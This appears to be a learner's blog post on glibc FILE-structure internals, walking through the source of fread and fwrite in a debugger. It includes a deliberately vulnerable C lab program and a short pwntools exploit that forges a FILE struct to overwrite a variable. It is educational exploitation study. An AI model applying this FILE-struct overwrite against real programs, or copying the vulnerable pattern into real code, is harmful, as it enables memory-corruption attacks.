[{"title":"I_O Learning By H1m","url":"/2025/12/27/I_O%20Learning%20By%20H1m/","content":"I&#x2F;O Learning –the func fread\tOne and a half months since I started, I have learned from the stack to heap and now I am just starting to I&#x2F;O. I was supposed to study a few days ago, but it was delayed due to my own project and yesterday, I just have been playing a big international matches. in fact, I am looking for some better methods so that I can quickly get started. After asking many friends, I found out pwn.college. it’s the best choice. I need to finish it for one week. i know it is hard for me. However, i will try my best.\n\tI’ve watched these videos and am now going to make a brief summary. This will also serve as the opening part of the article. Let’s get started.\nPART1\tAt the beginning of the first video, the author compared the reading methods of two functions, and it is obvious that we know that the fread function and the fwrite function will be faster.\n\n\n\tAs we should make it quickly for us to use the libc has some useful func such as fopen, fread, fwrite which will be the key research topics.\n\n\n\tThen we pay our attation to the FILE struct, these buffer pointers. The picture below will show some important Pointers.\n\n\n\tWe some time need to change the flags for only-read or only-write.\n\tAt the beginning, we can see the read ptr has the same addr with buf base and read base. Same time read end go with buf end.\n\n\n\tAlso i will show the mid of the process \n\n\n\tAfter reading all, it will flash the buf and let new bytes to the mem.\n\tHere should konw one one thing. If the file is small we may can not read too much.\n\n\n\tThe fwrite is similar, so i would not pay more time to analysis. Just give one more picture.\n\n\n\tAnd now, we step into the next ved. \n\tWe can totally control the stream by changing its FILE struct.\n\n\n\tJust like this.\n\n\n\tRob make a simple exp, so i will use it\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;// Global win variableint win_var = 0;void win() &#123;    puts(&quot;You Win!&quot;);&#125;int main(int argc, char **argv) &#123;    // leak win_var    printf(&quot;win_var is located at: %p\\n&quot;, &amp;win_var);    // Open a file    FILE *file_pointer = fopen(&quot;./flag&quot;, &quot;r&quot;);    // Overwrite the file struct from stdin    read(0, file_pointer, 0x100);    // Call freed on the file    char buf[256];    puts(&quot;Calling freed!&quot;);    fread(buf, 1, 10, file_pointer);    if (win_var) &#123;        win();    &#125;&#125;\n\n\tNext i will try it by myself. \ncontext.arch = &#x27;amd64&#x27;p = process(&#x27;./a.out&#x27;)p.recvuntil(b&#x27;at: &#x27;)win_var_leak = int(p.recvline()[:-1],16) print(hex(win_var_leak))fp = FileStructure()p.interactive()```\n\n\tTo think of something, first we shoule pay attaention to what is FileStructure\n\tLet’s see more.\nType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from pwn import*&gt;&gt;&gt; fp = FileStructure()&gt;&gt;&gt; fp&#123; flags: 0x0 _IO_read_ptr: 0x0 _IO_read_end: 0x0 _IO_read_base: 0x0 _IO_write_base: 0x0 _IO_write_ptr: 0x0 _IO_write_end: 0x0 _IO_buf_base: 0x0 _IO_buf_end: 0x0 _IO_save_base: 0x0 _IO_backup_base: 0x0 _IO_save_end: 0x0 markers: 0x0 chain: 0x0 fileno: 0x0 _flags2: 0x0 _old_offset: 0xffffffff _cur_column: 0x0 _vtable_offset: 0x0 _shortbuf: 0x0 unknown1: 0x0 _lock: 0x0 _offset: 0xffffffffffffffff _codecvt: 0x0 _wide_data: 0x0 unknown2: 0x0 vtable: 0x0&#125;\n&lt;font style=&quot;color:rgb(31, 9, 9);&quot;&gt;\t&lt;/font&gt;&lt;font style=&quot;color:rgb(31, 9, 9);&quot;&gt;Here is what filestructure look like.&lt;/font&gt;```plaincontext.arch = &#x27;amd64&#x27;p = process(&#x27;./a.out&#x27;)p.recvuntil(b&#x27;at: &#x27;)win_var_leak = int(p.recvline()[:-1],16) print(hex(win_var_leak))fp = FileStructure()payload = fp.read(win_var_leak, 20)p.send(payload)p.interactive()```\n\n\n\n\tWe can finally finish our first exp! And why should this do such func. We should pay more to find out.\n\tTake somtime to see this \n0x63cc3dfd4014&#123; flags: 0x0 _IO_read_ptr: 0x0 _IO_read_end: 0x0 _IO_read_base: 0x0 _IO_write_base: 0x0 _IO_write_ptr: 0x0 _IO_write_end: 0x0 _IO_buf_base: 0x63cc3dfd4014 _IO_buf_end: 0x63cc3dfd4028 _IO_save_base: 0x0 _IO_backup_base: 0x0 _IO_save_end: 0x0 markers: 0x0 chain: 0x0 fileno: 0x0 _flags2: 0x0 _old_offset: 0xffffffffffffffff _cur_column: 0x0 _vtable_offset: 0x0 _shortbuf: 0x0 unknown1: 0x0 _lock: 0x0 _offset: 0xffffffffffffffff _codecvt: 0x0 _wide_data: 0x0 unknown2: 0x0 vtable: 0x0&#125;```\n\n\twhen we use fp.read(). it will definitly change the values. And it will fit all the requuirements!\n\tNow i will have a quick understanding of this function, so i use CHATGPT, but when you read deeper i will show more details and use the source code to analysis, AI may not as right so just make a simple glance:)\nPART2WHAT AI SAID\tThe &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fread&lt;/font&gt; function is a high-level, buffered input operation. Its primary goal is to minimize expensive system calls by reading large chunks of data from the operating system into an internal buffer, and then serving user requests from that buffer.\n\tHere is the typical execution flow:\n\t1.Validate the FILE Stream\n&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;if (!_IO_valid_file(file_pointer)) return EOF;&lt;/font&gt;\n\tBefore any operation, &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fread&lt;/font&gt; must check if the provided &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;FILE*&lt;/font&gt; (file pointer) is valid and usable.\n\t2.Check the Internal Buffer (User-Space Buffer)\nif (file_pointer-&gt;_IO_read_ptr &lt; file_pointer-&gt;_IO_read_end) &#123;    size_t avail = file_pointer-&gt;_IO_read_end - file_pointer-&gt;_IO_read_ptr;    size_t to_copy = min(requested_size, avail);    memcpy(user_buf, file_pointer-&gt;_IO_read_ptr, to_copy);    file_pointer-&gt;_IO_read_ptr += to_copy;    return to_copy;&#125;\n\n\tExplanation: This is the core of buffered I&#x2F;O. The FILE structure contains pointers to manage its internal buffer: _IO_read_ptr: Current position in the buffer for reading. _IO_read_end: End of the valid data in the buffer.\n\tThe Check: If _IO_read_ptr &lt; _IO_read_end, it means there is still data left in the buffer from a previous read operation.\n\t3.If the Buffer is Empty, Call the Underlying Read Function\n&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;bytes_read = _IO_file_xsgetn(file_pointer, user_buf, requested_size);&lt;/font&gt;\n\tExplanation: If the internal buffer is empty (_IO_read_ptr &gt;&#x3D; _IO_read_end), control is passed to a lower-level function, typically _IO_file_xsgetn. \n\tSo If we meet the requirements mentioned above, we can bypass the detection.\n\tBack to the normal process, we will see\n\n\n\tthis is i add some code after fread func, and this time i will use no exp to bypassing it.\nprintf(&quot;%s\\n&quot;,buf);```\n\nREALLY CHECK\tThe overall process involves the fread function calling IO_file_xsgetn from the vtable, where IO_file_xsgetn serves as the core function of fread. Its workflow can be roughly summarized as follows:\t\n\n\n\t1.Check if the input buffer fp-&gt;_IO_buf_base is empty. If it is, call _IO_doalllocbuf to initialize the input buffer.\n\t2.After allocating the input buffer or if the input buffer is not empty, check whether the input buffer contains any data.\n\t3.If data exists in the input buffer, it is directly copied to the user buffer. If there is no data or insufficient data, the _underflow function is called to execute a system call, reading data into the input buffer before copying it to the user buffer.\n\tThe function prototype of fread is:\n&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;size_t fread(void *ptr, size_t size, size_t count, FILE *stream);&lt;/font&gt;\n\tWhere:\n\t\tptr: Pointer to the location where the result is stored.\n\t\tsize: Size of each data type.\n\t\tcount: Number of data elements.\n\t\tstream: File pointer.\n\tThe function returns the number of data elements successfully read.\n#include&lt;stdio.h&gt;int main()&#123;    FILE* fp = fopen(&quot;flag&quot;,&quot;rb&quot;);    char *ptr = malloc(0x20);    fread(ptr, 1, 20, fp);    return 0;&#125;```\n\n\tBefore fread we set a point and use r\n$1 = &#123;  file = &#123;    _flags = -72539000,    _IO_read_ptr = 0x0,    _IO_read_end = 0x0,    _IO_read_base = 0x0,    _IO_write_base = 0x0,    _IO_write_ptr = 0x0,    _IO_write_end = 0x0,    _IO_buf_base = 0x0,    _IO_buf_end = 0x0,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,    _fileno = 3,    _flags2 = 0,    _old_offset = 0,    _cur_column = 0,    _vtable_offset = 0 &#x27;\\000&#x27;,    _shortbuf = &quot;&quot;,    _lock = 0x555555559380,    _offset = -1,    _codecvt = 0x0,    _wide_data = 0x555555559390,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0,    _mode = 0,    _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;&#125;```\n\n\tWhen I call fread, I will execute this code.\n_IO_size_t_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)&#123;  _IO_size_t bytes_requested = size * count;  _IO_size_t bytes_read;  CHECK_FILE (fp, 0);  if (bytes_requested == 0)    return 0;  _IO_acquire_lock (fp);  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);  _IO_release_lock (fp);  return bytes_requested == bytes_read ? count : bytes_read / size;&#125;libc_hidden_def (_IO_fread)&#125;\n\n\tThen we goto _IO_sgetn\n_IO_size_t_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)&#123;  /* FIXME handle putback buffer here! */  return _IO_XSGETN (fp, data, n);&#125;libc_hidden_def (_IO_sgetn)\n\n\tgoto _io_xsgetn\n\t&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)&lt;/font&gt;\n\t&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_file_xsgetn&lt;/font&gt; is the core function that handles data reading for &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fread&lt;/font&gt;. It can be divided into the following parts:\n\nWhen &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_buf_base&lt;/font&gt; is NULL, it indicates that the pointers in the FILE structure are uninitialized and the input buffer has not been established. In this case, &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_doallocbuf&lt;/font&gt; is called to initialize the pointers and set up the input buffer.\nWhen there is data in the input buffer (i.e., &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_read_ptr&lt;/font&gt; is less than &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_read_end&lt;/font&gt;), the data from the buffer is directly copied to the target buffer.\nIf the input buffer is empty or cannot fully satisfy the read request, &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;__underflow&lt;/font&gt; is called to invoke a system call and read data into the input buffer.\n\n_IO_size_t_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)&#123;  _IO_size_t want, have;  _IO_ssize_t count;  char *s = data;  want = n;  if (fp-&gt;_IO_buf_base == NULL)    &#123;      ...      _IO_doallocbuf (fp);    &#125;  while (want &gt; 0)    &#123;      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;      if (want &lt;= have)       &#123;      memcpy (s, fp-&gt;_IO_read_ptr, want);      fp-&gt;_IO_read_ptr += want;      want = 0;    &#125;      else    &#123;      if (have &gt; 0)          &#123;          ...          memcpy (s, fp-&gt;_IO_read_ptr, have);          s += have;          want -= have;          fp-&gt;_IO_read_ptr += have;        &#125;      if (fp-&gt;_IO_buf_base          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))        &#123;          if (__underflow (fp) == EOF)           break;          continue;        &#125;      ...  return n - want;&#125;libc_hidden_def (_IO_file_xsgetn)\n\nSTAGE1\t\tFirst, when &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_buf_base&lt;/font&gt; is NULL, meaning the input buffer has not been established, the code calls &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_doallocbuf&lt;/font&gt; to create the input buffer. Let’s follow into the &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_doallocbuf&lt;/font&gt; function to see how it initializes the buffer and allocates space for the input buffer. The file is located in &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;/libio/genops.c&lt;/font&gt;.\nvoid_IO_doallocbuf (_IO_FILE *fp)&#123;  if (fp-&gt;_IO_buf_base)     return;  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0)     if (_IO_DOALLOCATE (fp) != EOF)       return;  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);&#125;libc_hidden_def (_IO_doallocbuf)\n\n\tThe function first checks whether &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_buf_base&lt;/font&gt; is NULL. If it is not NULL, it indicates that the input buffer has already been initialized, and the function returns directly. If it is NULL, the function then checks &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_flags&lt;/font&gt; to see if it is &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_UNBUFFERED&lt;/font&gt; or if &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_mode&lt;/font&gt; is greater than 0. If either condition is met, it calls &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_file_doallocate&lt;/font&gt; from the FILE’s vtable. Let’s follow into this function, located in &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;/libio/filedoalloc.c&lt;/font&gt;.\n_IO_file_doallocate (_IO_FILE *fp)&#123;  _IO_size_t size;  char *p;  struct stat64 st;  ...  size = _IO_BUFSIZ;  ...  if (fp-&gt;_fileno &gt;= 0 &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), 0) &gt;= 0)    &#123;     ...      if (st.st_blksize &gt; 0)         size = st.st_blksize;     ...   &#125; p = malloc (size); ... _IO_setb (fp, p, p + size, 1);   return 1;&#125;libc_hidden_def (_IO_file_doallocate)\n\n\tAnd we still keep going to the func &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_setb&lt;/font&gt;\nvoid_IO_setb (_IO_FILE *f, char *b, char *eb, int a)&#123;  ...  f-&gt;_IO_buf_base = b;   f-&gt;_IO_buf_end = eb;   ...&#125;libc_hidden_def (_IO_setb)\n\n\tAfter setting &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_buf_base&lt;/font&gt; and &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_buf_end&lt;/font&gt;, once &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;IO_setb&lt;/font&gt; finishes executing, these two pointers in &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp&lt;/font&gt; are assigned their values.\n\tTo have more inform we should download something, we put the glibc-2.35 to &#x2F;usr&#x2F;src&#x2F;glibc&#x2F;glibc-2.35.\n\tAnd we can see these\n\n\n\tWe will use some of the file to better trace our program.\n\tusing the command below.\n&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;pwndbg&gt; directory /usr/src/glibc/glibc-2.35/libio&lt;/font&gt;\n\talso we should use step or next to join or skip another func such as belows.\n\n\n\n\n\t_IO_XSGETN is a macro. If we step directly, we can get the following diagram.\n\n\n\tDue to its uninit we can see it go there as below\n\n\n\n\n\tAfter make the size we will see the filestructure again\n\n\n\n\n\tStill we can see the point will have some values.\n\n\n\tFor there we finish the stage1\nSTAGE2\tNext, the program enters stage2: copying data from the input buffer.If the buffer already contains data, it is copied directly to the destination buffer.\n\tHere we can see that\n\n&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_read_ptr&lt;/font&gt; points to the start of the input buffer,\n&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_read_end&lt;/font&gt; points to the end of the input buffer.\n\n\tThe region between these two pointers is copied to the destination buffer with &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;memcpy&lt;/font&gt;.\n\tWhen the input buffer is empty or does not satisfy the request, execution proceeds to the final step:**&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;__underflow&lt;/font&gt;**, which issues the &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;read&lt;/font&gt; system call to refill the buffer.In our example this is the first read, so both &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_read_ptr&lt;/font&gt; and &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_read_end&lt;/font&gt; are NULL;consequently we enter &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;__underflow&lt;/font&gt;.\tThe implementation is located in &#x2F;libio&#x2F;genops.c—let’s step into it.\nint__underflow (_IO_FILE *fp)&#123;  ...  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    return *(unsigned char *) fp-&gt;_IO_read_ptr;  ...  return _IO_UNDERFLOW (fp);&#125;libc_hidden_def (__underflow)\n\n\n\n\tInvoke the &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_UNDERFLOW&lt;/font&gt; function. \n\n\n\n\nint_IO_new_file_underflow (_IO_FILE *fp)&#123;  _IO_ssize_t count;  ...  if (fp-&gt;_flags &amp; _IO_NO_READS)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    return *(unsigned char *) fp-&gt;_IO_read_ptr;  ...  if (fp-&gt;_IO_buf_base == NULL)    &#123;      ...      _IO_doallocbuf (fp);    &#125;  ...  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end    = fp-&gt;_IO_buf_base;  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  ...  fp-&gt;_IO_read_end += count;  ...  return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125;libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)\n\n\tThis &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_new_file_underflow&lt;/font&gt; function is the point where the system call is ultimately invoked. Before finally executing the system call, there are still some checks. The entire process is as follows:\n\nCheck whether the &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_flags&lt;/font&gt; field of the FILE structure contains &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_NO_READS&lt;/font&gt;. If this flag is present, it directly returns &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;EOF&lt;/font&gt;. The &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_NO_READS&lt;/font&gt; flag is defined as:&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;#define _IO_NO_READS 4 /* Reading not allowed */&lt;/font&gt;\nIf &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_buf_base&lt;/font&gt; is &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;NULL&lt;/font&gt;, call &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_doallocbuf&lt;/font&gt; to allocate the input buffer.\nThen, initialize and set the FILE structure pointers, setting all of them to &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_buf_base&lt;/font&gt;.\nCall &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_SYSREAD&lt;/font&gt; (the &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;_IO_file_read&lt;/font&gt; function in the vtable), which ultimately executes the &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;read&lt;/font&gt; system call.The data is read into &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_buf_base&lt;/font&gt;, and the read size is the input buffer capacity:&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base&lt;/font&gt;.\nThen mark the amount of data now available in the input buffer by updating&lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;fp-&gt;_IO_read_end += count&lt;/font&gt;\n\n\n\n\n\n\n\n\tAfter these functions, all pointers in the FILE structure have been initialized, the file data has been read in, and the input buffer now contains valid data.\n\tLet’s see it!!!\n\n\n\tfor here we will ret to _IO_file_xsgetn because of the &lt;font style=&quot;color:rgb(31, 9, 9);background-color:rgb(218, 218, 218);&quot;&gt;while&lt;/font&gt;\n\tThen we will go another process, because i just close it…\nSTAGE3\tJUST open it again,let ‘s reback here.’\n\tAfter execute the _IO_read_file we can see this \n_IO_ssize_t_IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)&#123;   return (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, 0)           ? read_not_cancel (fp-&gt;_fileno, buf, size)           : read (fp-&gt;_fileno, buf, size)); &#125;\n\n\n\n\tHere we have let our flag into the buf and have set all the points.\n\tThen, try to see the heap\n\n\n\tHere must be our PTR which we finally will let flag in.\n\tlet’s continue to trace.\n\n\n\tWe can see the end of read ptr will add the size of flag\n\n\n\tThen we back to _IO_file_xsgetn as below\n\n\n\tThis time we will go to a place which want&gt;have but have&gt;0\n\n\n\tAnd we exactlly go there i am right\n\n\n\tAfter the memcpy we can definitly see flag be the place in the heap\n\n\n\tAlso we will continue to go to wiile because the size of flag is 18 but we need 2 more. if you are confused, just see the source code above.\n\tLet us see this picture \n\n\n\tWe back here and go the way.\n\tTill here, all about the fread has been done, that’s fun, isn’t it?\n\tNONONO, we still have something to do\nPART3 \tHold on BRO, we are nearly here!!!\n\tWhen we call the fread function, it first checks if our buf is not empty, and then it does the build. Next, he will shift all the pointers towards the buf base. Execute the read function inside, read the contents of the file to our buff position, and mutate the read end pointed. Returning to the loop, If we what we have bigger then we want, we can allocate them directly. If we still want more than we have, we will allocate a portion and go through the above steps again. This is the entire process of this function\n\tNOW, i mean we should just reback to the exp for why it can success.\npayload &#x3D; fp.read(win_var_leak, 20)&#96;&#96;&#96;\n\tThis is what we do!\n\tAnd we do make the fp amazingggg\n_IO_read_ptr: 0x0 _IO_read_end: 0x0 _IO_read_base: 0x0 _IO_write_base: 0x0 _IO_write_ptr: 0x0 _IO_write_end: 0x0 _IO_buf_base: 0x63cc3dfd4014 _IO_buf_end: 0x63cc3dfd4028 ... fileno: 0x0\n\n\tWhen our fread see this. And we still go to the function _IO_file_xsgetn, but this time we check for we have buf addr. so we go straight to the __underflow and this time we read from stdin because we make fileno 0x0, so when we put our data in the terminal, we will make them fill the win_var_addr. then we can trigger the WIN. That’s it.\nI&#x2F;O Learning –the func fwrite  HI guys. It’s me again. Now i will let the ‘I&#x2F;O Learning’ to the second part. we will go to the func fwrite.\nPART1As the beginning, we should alawys check the Flowchart：\n\n\nAs similarly, we make a simple program to strace the whole flow.\n#include&lt;stdio.h&gt;int main()&#123;    FILE* fp = fopen(&quot;flag&quot;,&quot;wb&quot;);    char *ptr = malloc(0x20);    fwrite(ptr, 1, 0x20, fp);    return 0;&#125; \n\nJust as before we break at line 7 and use r\nSTAGE1\n\nhere we continue to step\nAt beginning, almost no points has been initialized.\n\n\n\n\nHere, we enter the first function _IO_new_file_xsputn. Its primary function is to determine how much space is left in the output buffer.\nIn the scenario described by the sample program, values like f-&gt;_IO_write_end and f-&gt;_IO_write_ptr are both 0, indicating that the current output buffer size is 0.\nAnother part of its logic is that if the output buffer still has free space, it copies the target (in the program we called “ptr” also called “s”) output data into this buffer. It then calculates whether any target data remains after the output buffer has been filled.\n_IO_size_t_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)&#123;     _IO_size_t count = 0;...    else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */  if (count &gt; 0)    &#123;      if (count &gt; to_do)  count = to_do;  ...      memcpy (f-&gt;_IO_write_ptr, s, count);      f-&gt;_IO_write_ptr += count;      s += count;      to_do -= count;\n\nCertainly, we will go to the way where count = 0. Then we will step into _IO_OVERFLOW\n\n\n\nSTAGE2We go step!\n\n\nint_IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */    if (_IO_do_flush (f) == EOF)      return EOF;  *f-&gt;_IO_write_ptr++ = ch;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))    if (_IO_do_write (f, f-&gt;_IO_write_base,\t\t      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)      return EOF;  return (unsigned char) ch;&#125;\n\nThe __overflow function first checks if the flags field of the _IO_FILE structure contains the _IO_NO_WRITES flag. If the flag is set, the function returns immediately.\nIt then checks if f-&gt;_IO_write_base is NULL. A NULL value indicates that the output buffer has not been initialized&#x2F;allocated. In this case, the function calls _IO_doallocbuf to allocate the output buffer.\n\n\nAs we have already analyzed the source code of the _IO_doallocbuf function in the previous section on fread, we will not delve into it again here. we just see the result. But notice one thing, HERE we also Initialize the read point by using the func of _IO_setg.   \n\n\nThen after some Assign, we can see all the point has the values.\n\n\nContinue to next func\n\n\nThe function calls new_do_write; step into it. The implementation is in &#x2F;libio&#x2F;fileops.c.\nWe can see there to_do is 0 because  the write base is the same as write ptr so we will never go to new_do_write. then we ret with 0 then we ret to the upper-level function, I will make a direcction below.\nif (ch == EOF)  return _IO_do_write (f, f-&gt;_IO_write_base,     f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);if 